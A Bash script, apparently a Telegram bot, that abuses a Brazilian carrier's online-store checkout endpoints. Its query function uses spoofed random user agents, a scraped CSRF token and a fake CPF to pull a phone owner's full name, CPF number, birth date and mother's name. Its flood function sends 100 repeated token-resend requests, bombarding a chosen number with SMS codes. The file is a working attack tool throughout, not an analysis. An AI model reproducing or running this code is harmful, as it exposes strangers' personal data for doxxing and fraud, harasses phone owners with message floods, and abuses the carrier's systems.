		UserAgent="Mozilla/5.0 (Linux; Android ${AndroidVersions[$(shuf -i 0-44 --random-source '/dev/urandom' | head -c '2')]}) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') YaBrowser/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').$(tr -dc '1-9' < '/dev/urandom' | head -c '2').$(tr -dc '0-9' < '/dev/urandom' | head -c '1').$(tr -dc '1-9' < '/dev/urandom' | head -c '3') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2')"
	# Yandex on iOS
	elif [ "$SystemSelection" = '4' ]; then
		UserAgent="Mozilla/5.0 (iPhone; CPU iPhone OS ${iOSVersions[$(shuf -i 0-10 --random-source '/dev/urandom' | head -c '2')]} like Mac OS X) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '0-9' < '/dev/urandom' | head -c '1').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Version/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').$(tr -dc '0-9' < '/dev/urandom' | head -c '1') YaBrowser/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').$(tr -dc '1-9' < '/dev/urandom' | head -c '2').$(tr -dc '0-9' < '/dev/urandom' | head -c '1').$(tr -dc '1-9' < '/dev/urandom' | head -c '3') Mobile/$(tr -dc A-Z1-9 < '/dev/urandom' | head -c '5') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2')"
	else
		# If for some reason the "SystemSelection" variable returns an invalid value, set a predefined user agent (Yandex on macOS)
		UserAgent='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 YaBrowser/19.6.0.1583 Yowser/2.5 Safari/537.36'
	fi

}

declare -rgf 'GenerateYandex'

function DetectRequestErrors()
{

	declare -r ExitCode="$?"

	if [ "$ExitCode" = '0' ]; then
		return '0'
	elif [ "$ExitCode" = '1' ]; then
		ErrorMessage='Unsupported protocol. This build of curl has no support for this protocol.'
	elif [ "$ExitCode" = '2' ]; then
		ErrorMessage='Failed to initialize.'
	elif [ "$ExitCode" = '3' ]; then
		ErrorMessage='URL malformed. The syntax was not correct.'
	elif [ "$ExitCode" = '4' ]; then
		ErrorMessage='A feature or option that was needed to perform the desired request was not enabled or was explicitly disabled at build-time. To make curl able to do this, you probably need another build of libcurl!'
	elif [ "$ExitCode" = '5' ]; then
		ErrorMessage='Couldn'\''t resolve proxy. The given proxy host could not be resolved.'
	elif [ "$ExitCode" = '6' ]; then
		ErrorMessage='Couldn'\''t resolve host. The given remote host was not resolved.'
	elif [ "$ExitCode" = '7' ]; then
		ErrorMessage='Failed to connect to host.'
	elif [ "$ExitCode" = '8' ]; then
		ErrorMessage='Weird server reply. The server sent data curl couldn'\''t parse.'
	elif [ "$ExitCode" = '16' ]; then
		ErrorMessage='HTTP/2 error. A problem was detected in the HTTP2 framing layer. This is somewhat generic and can be one out of several problems, see the error message for details.'
	elif [ "$ExitCode" = '18' ]; then
		ErrorMessage='Partial file. Only a part of the file was transferred.'
	elif [ "$ExitCode" = '12' ]; then
		ErrorMessage='HTTP page not retrieved. The requested url was not found or returned another error with the HTTP error code being 400 or above.'
	elif [ "$ExitCode" = '23' ]; then
		ErrorMessage='Write error. Curl couldn'\''t write data to a filesystem or similar.'
	elif [ "$ExitCode" = '26' ]; then
		ErrorMessage='Read error. Various reading problems.'
	elif [ "$ExitCode" = '27' ]; then
		ErrorMessage='Out of memory. A memory allocation request failed.'
	elif [ "$ExitCode" = '28' ]; then
		ErrorMessage='Operation timeout. The specified time-out period was reached according to the conditions.'
	elif [ "$ExitCode" = '33' ]; then
		ErrorMessage='HTTP range error. The range "command" didn'\''t work.'
	elif [ "$ExitCode" = '34' ]; then
		ErrorMessage='HTTP post error. Internal post-request generation error.'
	elif [ "$ExitCode" = '35' ]; then
		ErrorMessage='SSL connect error. The SSL handshaking failed.'
	elif [ "$ExitCode" = '36' ]; then
		ErrorMessage='Bad download resume. Couldn'\''t continue an earlier aborted download.'
	elif [ "$ExitCode" = '37' ]; then
		ErrorMessage='FILE couldn'\''t read file. Failed to open the file. Permissions?'
	elif [ "$ExitCode" = '42' ]; then
		ErrorMessage='Aborted by callback. An application told curl to abort the operation.'
	elif [ "$ExitCode" = '43' ]; then
		ErrorMessage='Internal error. A function was called with a bad parameter.'
	elif [ "$ExitCode" = '44' ]; then
		ErrorMessage='Interface error. A specified outgoing interface could not be used.'
	elif [ "$ExitCode" = '47' ]; then
		ErrorMessage='Too many redirects. When following redirects, curl hit the maximum amount.'
	elif [ "$ExitCode" = '48' ]; then
		ErrorMessage='Unknown option specified to libcurl. This indicates that you passed a weird option to curl that was passed on to libcurl and rejected. Read up in the manual!'
	elif [ "$ExitCode" = '51' ]; then
		ErrorMessage='The peer'\''s SSL certificate or SSH MD5 fingerprint was not OK.'
	elif [ "$ExitCode" = '52' ]; then
		ErrorMessage='The server didn'\''t reply anything, which here is considered an error.'
	elif [ "$ExitCode" = '53' ]; then
		ErrorMessage='SSL crypto engine not found.'
	elif [ "$ExitCode" = '54' ]; then
		ErrorMessage='Cannot set SSL crypto engine as default.'
	elif [ "$ExitCode" = '55' ]; then
		ErrorMessage='Failed sending network data.'
	elif [ "$ExitCode" = '56' ]; then
		ErrorMessage='Failure in receiving network data.'
	elif [ "$ExitCode" = '58' ]; then
		ErrorMessage='Problem with the certificate.'
	elif [ "$ExitCode" = '59' ]; then
		ErrorMessage='Couldn'\''t use specified SSL cipher.'
	elif [ "$ExitCode" = '60' ]; then
		ErrorMessage='Peer certificate cannot be authenticated with known CA certificates.'
	elif [ "$ExitCode" = '61' ]; then
		ErrorMessage='Unrecognized transfer encoding.'
	elif [ "$ExitCode" = '63' ]; then
		ErrorMessage='Maximum file size exceeded.'
	elif [ "$ExitCode" = '65' ]; then
		ErrorMessage='Sending the data requires a rewind that failed.'
	elif [ "$ExitCode" = '66' ]; then
		ErrorMessage='Failed to initialise SSL Engine.'
	elif [ "$ExitCode" = '75' ]; then
		ErrorMessage='Character conversion failed.'
	elif [ "$ExitCode" = '76' ]; then
		ErrorMessage='Character conversion functions required.'
	elif [ "$ExitCode" = '77' ]; then
		ErrorMessage='Problem with reading the SSL CA cert (path? access rights?).'
	elif [ "$ExitCode" = '78' ]; then
		ErrorMessage='The resource referenced in the URL does not exist.'
	elif [ "$ExitCode" = '80' ]; then
		ErrorMessage='Failed to shut down the SSL connection.'
	elif [ "$ExitCode" = '82' ]; then
		ErrorMessage='Could not load CRL file, missing or wrong format'
	elif [ "$ExitCode" = '83' ]; then
		ErrorMessage='Issuer check failed'
	elif [ "$ExitCode" = '89' ]; then
		ErrorMessage='No connection available, the session will be queued'
	elif [ "$ExitCode" = '90' ]; then
		ErrorMessage='SSL public key does not matched pinned public key'
	elif [ "$ExitCode" = '91' ]; then
		ErrorMessage='Invalid SSL certificate status.'
	elif [ "$ExitCode" = '92' ]; then
		ErrorMessage='Stream error in HTTP/2 framing layer.'
	fi

	declare -r 'ErrorMessage'

	if [ "$ExitCode" != '0' ]; then
		if [ -n "$ErrorMessage" ]; then
			editMessageText --chat_id "$message_chat_id" \
											--message_id "$result_message_id" \
											--text "A tentativa de conexão resultou em um erro:\n\n*Código*: \`$ExitCode\`\n*Descrição*: \`$ErrorMessage\`" \
											--parse_mode 'markdown'
			exit '0'
		else
			editMessageText --chat_id "$message_chat_id" \
											--message_id "$result_message_id" \
											--text "$(api_unknown_error_text)" \
											--parse_mode 'markdown'
			exit '0'
		fi
	elif [[ $(wc -w "$DownloadableFile") = '0' ]]; then
		editMessageText --chat_id "$message_chat_id" \
										--message_id "$result_message_id" \
										--text "$(api_unknown_error_text)" \
										--parse_mode 'markdown'
		exit '0'
	fi

}

declare -rgf 'DetectRequestErrors'

function GetJsonData()
{

	if [ "$1" = 'nomeCompleto' ]; then
		declare -r data=$(jq --raw-output '.pessoa.nomeCompleto' "$JsonResponse" | ParseOutput)
		if [ "$data" = 'NÃO CLASSIFICADO' ]; then
			jq --raw-output '.data.nomeCompleto' "$JsonResponse" | ParseOutput
		else
			echo "$data"
		fi
	elif [ "$1" = 'numeroDocumento' ]; then
		declare -r data=$(jq --raw-output '.pessoa.numeroDocumento' "$JsonResponse" | ParseOutput)
		if [ "$data" = 'NÃO CLASSIFICADO' ]; then
			jq --raw-output '.data.cpf' "$JsonResponse" | ParseOutput
		else
			echo "$data"
		fi
	elif [ "$1" = 'dataNascimento' ]; then
		declare -r data=$(jq --raw-output '.pessoa.dataNascimento' "$JsonResponse" | ConvertEpoch | ParseOutput)
		if [ "$data" = 'NÃO CLASSIFICADO' ]; then
			jq --raw-output '.data.dataNascimento' "$JsonResponse" | ParseOutput
		else
			echo "$data"
		fi
	elif [ "$1" = 'nomeDaMae' ]; then
		declare -r data=$(jq --raw-output '.pessoa.nomeDaMae' "$JsonResponse" | ParseOutput)
		if [ "$data" = 'NÃO CLASSIFICADO' ]; then
			jq --raw-output '.data.nomeMae' "$JsonResponse" | ParseOutput
		else
			echo "$data"
		fi
	fi

}

declare -rgf 'GetJsonData'

function SaveCookiesAndTokens()
{

	editMessageText --chat_id "$message_chat_id" \
									--message_id "$result_message_id" \
									--text 'Salvando cookies e tokens de acesso temporários...'

	declare -r DownloadableFile="$CSRFTokenFile"
	
	declare -rg CookiesFile=$(mktemp) && declare -rg CSRFTokenFile=$(mktemp)

	curl --url "https://lojaonline.vivo.com.br:443/vivostorefront/checkout-express?site=vivo&plan=$plan_code&packages=VIDEOEMUSICA&site=vivocontrolle&origin=lpcontrolegiga" \
		--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
		--request 'GET' \
		--silent \
		--http2 \
		--tlsv1.2 \
		--fail \
		--header 'Accept:' \
		--user-agent "$UserAgent" \
		--no-buffer \
		--ipv4 \
		--no-progress-meter \
		--connect-timeout '25' \
		--cacert "$HOME/Nourin/cacert.pem" \
		--globoff \
		--path-as-is \
		--proto '=https' \
		--tcp-nodelay \
		--no-sessionid \
		--ssl-reqd \
		--no-keepalive \
		--cookie-jar "$CookiesFile" \
		--output "$CSRFTokenFile"

	DetectRequestErrors

	declare -rg csrf_token=$(grep --max-count '1' --perl-regexp --only-matching --text 'CSRFToken.*"\b\K.+(?=")' "$CSRFTokenFile")

}

declare -rgf 'SaveCookiesAndTokens'

function SetEnvironmentVariables()
{

	sendMessage --reply_to_message_id "$message_message_id" \
								--chat_id "$message_chat_id" \
								--text 'Configurando variáveis de ambiente...' \
								--disable_notification 'true'

	declare -g JsonResponse=$(mktemp) && declare -g ServerHeaders=$(mktemp)

	declare -rg random_cpf=$(tr -dc '0-9' < '/dev/urandom' | head -c '3').$(tr -dc '0-9' < '/dev/urandom' | head -c '3').$(tr -dc '0-9' < '/dev/urandom' | head -c '3')-$(tr -dc '0-9' < '/dev/urandom' | head -c '2')
	
	declare -rg random_number=$(shuf -i '0-9' --random-source '/dev/urandom' | head -c '2')
	
	if [ "$random_number" = '1' ]; then
		plan_code='VIVOCTRLF44N'
	elif [ "$random_number" = '2' ]; then
		plan_code='VIVOCTRLF45N'
	elif [ "$random_number" = '3' ]; then
		plan_code='VIVOCTRLF46N'
	elif [ "$random_number" = '4' ]; then
		plan_code='VIVOCTRLF34N'
	elif [ "$random_number" = '5' ]; then
		plan_code='VIVOCTRLF34A'
	elif [ "$random_number" = '6' ]; then
		plan_code='VIVOCTRLF48N'
	elif [ "$random_number" = '7' ]; then
		plan_code='VIVOCTRLF49N'
	elif [ "$random_number" = '8' ]; then
		plan_code='VIVOCTRLF50N'
	elif [ "$random_number" = '9' ]; then
		plan_code='VIVOCTRLF51N'
	fi
	
	declare -rgf 'plan_code'
	
	GenerateUserAgent
	
}

declare -rgf 'SetEnvironmentVariables'

function CheckJsonFile()
{

	editMessageText --chat_id "$message_chat_id" \
									--message_id "$result_message_id" \
									--text 'Analisando estrutura dos dados recebidos...'
	
	if [[ $(grep --max-count '1' --perl-regexp --only-matching --text '^HTTP/[0-9](\.[0-9]+)\s\K.+(?=\ )' "$ServerHeaders") != '200' ]]; then
		editMessageText --chat_id "$message_chat_id" \
										--message_id "$result_message_id" \
										--text "$(api_unknown_error_text)" \
										--parse_mode 'markdown'
		exit '0'
	elif [[ -z $(jq --raw-output '.' "$JsonResponse") ]]; then
		editMessageText --chat_id "$message_chat_id" \
										--message_id "$result_message_id" \
										--text "$(api_unknown_error_text)" \
										--parse_mode 'markdown'
		exit '0'
	fi
	
	if [[ $(jq --raw-output '.isLineVivo' "$JsonResponse") = 'false' ]]; then
		editMessageText --chat_id "$message_chat_id" \
										--message_id "$result_message_id" \
										--text "$(number_not_found_text)" \
										--parse_mode 'markdown'
		exit '0'
	elif [[ $(jq --raw-output '.isPortability' "$JsonResponse") = 'true' ]]; then
		editMessageText --chat_id "$message_chat_id" \
										--message_id "$result_message_id" \
										--text "$(number_not_found_text)" \
										--parse_mode 'markdown'
		exit '0'
	fi
	
	
	if [[ $(jq --raw-output '.pessoa.descricaoTipoPessoa' "$JsonResponse") = 'PESSOA JURÍDICA' ]]; then
		declare -rg CNPJ='true'
	fi
	
	if [[ $(jq --raw-output '.error' "$JsonResponse") = 'Ocorreu um erro com o sistema'* ]]; then
		if ! [[ $(jq --raw-output '.pessoa.numeroDocumento' "$JsonResponse") =~ [0-9]{11} ]]; then	
			editMessageText --chat_id "$message_chat_id" \
											--message_id "$result_message_id" \
											--text "$(api_unknown_error_text)" \
											--parse_mode 'markdown'
			exit '0'
		fi
	fi
	
	return '0'
	
}

declare -rgf 'CheckJsonFile'

function QueryNumber()
{
	
	SetEnvironmentVariables
	
	SaveCookiesAndTokens
	
	editMessageText --chat_id "$message_chat_id" \
									--message_id "$result_message_id" \
									--text 'Consultando informações na base de dados...'
	
	declare -r DownloadableFile="$JsonResponse"
	
	curl --url 'https://lojaonline.vivo.com.br:443/vivostorefront/checkout-express/validateLine' \
		--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
		--request 'POST' \
		--silent \
		--http2 \
		--tlsv1.2 \
		--fail \
		--header 'Accept:' \
		--user-agent "$UserAgent" \
		--no-buffer \
		--ipv4 \
		--no-progress-meter \
		--connect-timeout '25' \
		--cacert "$HOME/Nourin/cacert.pem" \
		--globoff \
		--path-as-is \
		--proto '=https' \
		--tcp-nodelay \
		--no-sessionid \
		--ssl-reqd \
		--no-keepalive \
		--dump-header "$ServerHeaders" \
		--cookie "$CookiesFile" \
		--data "planCode=$plan_code&document=$random_cpf&phone=$formatted_telephone&CSRFToken=$csrf_token" \
		--output "$JsonResponse"
	
	DetectRequestErrors
	
	if [[ $(jq --raw-output '.pessoa.numeroDocumento' "$JsonResponse") =~ [0-9]{11} ]]; then
	
		declare -r JsonResponse2=$(mktemp) && declare -r ServerHeaders2=$(mktemp)
		
		declare -r formatted_cpf=$(sed -r 's/^([0-9]{3})([0-9]{3})([0-9]{3})([0-9]{2})$/\1.\2.\3-\4/g' <<< $(jq --raw-output '.pessoa.numeroDocumento' "$JsonResponse"))
		
		curl --url 'https://lojaonline.vivo.com.br:443/vivostorefront/checkout-express/validateLine' \
			--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
			--request 'POST' \
			--silent \
			--http2 \
			--tlsv1.2 \
			--fail \
			--header 'Accept:' \
			--user-agent "$UserAgent" \
			--no-buffer \
			--ipv4 \
			--no-progress-meter \
			--connect-timeout '25' \
			--cacert "$HOME/Nourin/cacert.pem" \
			--globoff \
			--path-as-is \
			--proto '=https' \
			--tcp-nodelay \
			--no-sessionid \
			--ssl-reqd \
			--no-keepalive \
			--dump-header "$ServerHeaders2" \
			--cookie "$CookiesFile" \
			--data "planCode=$plan_code&document=$formatted_cpf&phone=$formatted_telephone&CSRFToken=$csrf_token" \
			--output "$JsonResponse2"
		
		if ! [[ -z $(jq --raw-output '.' "$JsonResponse2") ]]; then
			declare -r JsonResponse="$JsonResponse2"
			declare -r ServerHeaders="$ServerHeaders2"
		fi
	fi
	
	CheckJsonFile
	
	editMessageText --chat_id "$message_chat_id" \
									--message_id "$result_message_id" \
									--text "$(if [ "$CNPJ" != 'true' ]; then common_results_text; else cnpj_results_text; fi)" \
									--parse_mode 'markdown' 
	
	exit '0'
	
}

declare -rgf 'QueryNumber'

function FloodNumber()
{
	
	SetEnvironmentVariables

	declare -i SuccessfullyFloods= && declare -i UnsuccessfullyFloods= && declare -i TotalOperations=

	SaveCookiesAndTokens

	curl --url 'https://lojaonline.vivo.com.br:443/vivostorefront/checkout-express/validateLine' \
		--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
		--request 'POST' \
		--silent \
		--http2 \
		--tlsv1.2 \
		--fail \
		--header 'Accept:' \
		--user-agent "$UserAgent" \
		--no-buffer \
		--ipv4 \
		--no-progress-meter \
		--connect-timeout '25' \
		--cacert "$HOME/Nourin/cacert.pem" \
		--globoff \
		--path-as-is \
		--proto '=https' \
		--tcp-nodelay \
		--no-sessionid \
		--ssl-reqd \
		--no-keepalive \
		--cookie "$CookiesFile" \
		--data "planCode=$plan_code&document=$random_cpf&phone=$formatted_telephone&CSRFToken=$csrf_token" \
		--output "$JsonResponse"
	
	DetectRequestErrors

	declare -ri OperationStartedTimestamp=$(printf '%(%s)T')

	while true
	do
		curl --url 'https://lojaonline.vivo.com.br:443/vivostorefront/checkout-express/re-send-token' \
			--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
			--request 'POST' \
			--silent \
			--http2 \
			--tlsv1.2 \
			--fail \
			--header 'Accept:' \
			--user-agent "$UserAgent" \
			--no-buffer \
			--ipv4 \
			--no-progress-meter \
			--connect-timeout '25' \
			--cacert "$HOME/Nourin/cacert.pem" \
			--globoff \
			--path-as-is \
			--proto '=https' \
			--tcp-nodelay \
			--no-sessionid \
			--ssl-reqd \
			--no-keepalive \
			--cookie "$CookiesFile" \
			--data "planCode=$plan_code&document=$random_cpf&phone=$formatted_telephone&CSRFToken=$csrf_token" \
			--output "$JsonResponse"
		
		let TotalOperations="TotalOperations+1"
		
		if [[ $(jq --raw-output '.success' "$JsonResponse") =~ .+ ]]; then
			let SuccessfullyFloods="SuccessfullyFloods+1"
		else
			let UnsuccessfullyFloods="UnsuccessfullyFloods+1"
		fi
		
		if [ "$TotalOperations" -ge '100' ]; then
			declare -ri OperationEndedTimestamp=$(printf '%(%s)T')
			editMessageText --chat_id "$message_chat_id" \
											--message_id "$result_message_id" \
											--text "$(flood_done_dialog)" \
											--parse_mode 'markdown' 
			break
		else
			editMessageText --chat_id "$message_chat_id" \
											--message_id "$result_message_id" \
											--text "$(flood_running_dialog)" \
											--parse_mode 'markdown' 
		fi
	done

	exit '0'

}

declare -rgf 'FloodNumber'

source "$HOME/Nourin/ShellBot.sh"

init --token 'SEU_TOKEN_AQUI'

while true; do

	# Get updates from the API
	getUpdates --limit '1' --offset "$(OffsetNext)" --timeout '60'

	# List received data
	for id in "$(ListUpdates)"; do

		if [ -z "$message_text" ]; then
			exit '0'
		elif [ -n "$message_reply_to_message_message_id" ]; then
			exit '0'
		fi
		
		declare -ri telephone=$(grep --max-count '1' --perl-regexp --only-matching --text '[0-9]+' <<< "$message_text" | tr '\n' ' ' | sed -r 's/\s+//g; s/^(55|0)//g; s/([0-9]{2})([0-9]{8,9})$/\1\2/g; s/([0-9]{11})$/\1/g; s/^([0-9]{2}).*([0-9]{8})$/\19\2/gm')
		declare -r formatted_telephone=$(sed -r 's/^([0-9]{2})/(\1)/g; s/([0-9]{4})$/-\1/g; s/([0-9]{5})/+\1/g' <<< "$telephone")

		if [[ "$message_text" =~ ^(\!|/)'start'$ ]]; then
			sendMessage --reply_to_message_id "$message_message_id" \
										--chat_id "$message_chat_id" \
										--text "$(start_text)" \
										--parse_mode 'markdown' \
										--disable_web_page_preview 'true' \
										--disable_notification 'true'
		elif [[ "$message_text" =~ ^(\!|/)'help'$ ]]; then
			sendMessage --reply_to_message_id "$message_message_id" \
										--chat_id "$message_chat_id" \
										--text "$(help_text)" \
										--parse_mode 'markdown' \
										--disable_web_page_preview 'true' \
										--disable_notification 'true'
		elif [[ "$message_text" =~ ^(\!|/)'about'$ ]]; then
			sendMessage --reply_to_message_id "$message_message_id" \
										--chat_id "$message_chat_id" \
										--text "$(about_text)" \
										--parse_mode 'markdown' \
										--disable_web_page_preview 'true' \
										--disable_notification 'true'
		elif [[ "$message_text" =~ ^(\!|/)'flood'$ ]]; then
			sendMessage --reply_to_message_id "$message_message_id" \
										--chat_id "$message_chat_id" \
										--text "$(flood_help_text)" \
										--parse_mode 'markdown' \
										--disable_notification 'true'
		elif [[ "$message_text" =~ ^(\!|/)'flood'\ .+$ ]]; then
			if [[ "$telephone" =~ ^[0-9]{10,11}$ ]]; then
				FloodNumber
			else
				sendMessage --reply_to_message_id "$message_message_id" \
											--chat_id "$message_chat_id" \
											--text "$(help_text)" \
											--parse_mode 'markdown' \
											--disable_web_page_preview 'true' \
											--disable_notification 'true'
			fi
		elif [[ "$telephone" =~ ^[0-9]{10,11}$ ]]; then
			QueryNumber
		elif [ "$message_text" ]; then
			sendMessage --reply_to_message_id "$message_message_id" \
										--chat_id "$message_chat_id" \
										--text "$(help_text)" \
										--parse_mode 'markdown' \
										--disable_web_page_preview 'true' \
										--disable_notification 'true'
		fi

		exit '0'
		
	done &

done
